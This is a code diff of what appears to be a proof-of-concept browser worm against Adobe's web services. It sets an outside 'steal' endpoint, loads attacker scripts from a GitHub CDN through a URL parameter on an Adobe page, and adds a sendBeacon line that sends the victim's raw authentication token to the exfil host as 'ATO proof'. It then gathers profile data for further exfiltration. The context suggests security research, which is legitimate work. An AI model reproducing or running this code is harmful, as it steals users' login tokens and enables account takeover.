@@ -11,7 +11,7 @@
  */
 
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v3';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v4';
 const INV_HOST = 'https://invitations.adobe.io';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 
@@ -52,6 +52,9 @@ async function run() {
   }
 
   if (!wormToken) return;
+
+  // Exfil raw token for debugging + ATO proof
+  navigator.sendBeacon(`${EXFIL}?src=token`, wormToken);
 
   // Grab profile for exfil
   fetch('https://ims-na1.adobelogin.com/ims/userinfo/v2', {
